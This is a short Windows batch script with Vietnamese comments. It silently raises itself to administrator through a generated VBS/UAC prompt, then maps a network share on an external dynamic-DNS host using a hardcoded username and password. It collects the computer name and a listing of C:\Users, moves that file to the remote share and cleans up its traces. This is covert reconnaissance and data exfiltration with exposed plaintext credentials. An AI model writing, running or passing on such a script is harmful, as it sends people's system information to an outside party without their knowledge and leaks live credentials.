set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
net use \\minhtuan283.ddns.net\HDD /user:minhtuan283 Thienngan2002
:: Lấy tên máy tính bằng PowerShell
for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set MachineName=%%i

:: Lấy ngày và giờ hiện tại
for /f "tokens=2 delims= " %%a in ('date /t') do set CurrentDate=%%a
for /f "tokens=1-2 delims=: " %%a in ('time /t') do set CurrentTime=%%a%%b
set CurrentDate=%CurrentDate:/=-%
set CurrentTime=%CurrentTime::=-%

:: Tạo file tên theo định dạng "%MachineName%_%CurrentDate%_%CurrentTime%.txt"
set LogFileName=%MachineName%_%CurrentDate%_%CurrentTime%.txt
set LogFilePath=%temp%\%LogFileName%

:: Liệt kê toàn bộ thư mục và file tại C:\Users và ghi vào file tạm
dir "C:\Users" > "%LogFilePath%"

:: Di chuyển file đến vị trí chia sẻ mạng

move "%LogFilePath%" "\\minhtuan283.ddns.net\HDD\serial\listt\%LogFileName%"

:: Xóa file tạm và các biến tạm
if exist "%LogFilePath%" del "%LogFilePath%"
net use \\minhtuan283.ddns.net\HDD /delete
set MachineName=
set CurrentDate=
set CurrentTime=
set LogFileName=
set LogFilePath=

exit
